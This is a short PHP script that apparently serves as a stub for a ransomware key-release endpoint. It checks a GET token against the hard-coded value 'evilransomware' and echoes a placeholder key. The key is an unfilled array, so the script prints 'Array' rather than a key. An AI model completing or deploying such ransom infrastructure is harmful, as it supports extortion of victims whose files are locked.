<?php
	
	$token='evilransomware';
	$key=['CLE A METTRE'];
	$user_token=htmlspecialchars($_GET["token"]);

	if($token==$user_token){
		echo $key;
	}
	else{
		echo '0';
	}

?>